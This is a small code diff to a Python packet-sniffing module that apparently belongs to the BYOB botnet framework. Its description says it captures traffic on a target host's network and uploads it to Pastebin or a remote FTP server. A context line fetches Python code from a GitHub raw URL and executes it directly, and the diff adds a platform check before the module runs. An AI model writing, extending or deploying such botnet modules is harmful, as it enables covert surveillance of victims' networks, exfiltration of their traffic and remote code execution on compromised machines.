@@ -19,17 +19,21 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages  = []
+packages = []
 platforms = ['linux2','darwin']
-results   = Queue.Queue()
-log       = StringIO.StringIO()
+results = {}
+log = StringIO.StringIO()
 usage  = 'packetsniffer [seconds]'
 desription = """ 
 Capture packets on the target client host machine's local network
 and optionally upload them to Pastebin or to a remote FTP server
-
 """
 
+# setup
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
 
 # main
 def _udp_header(data):
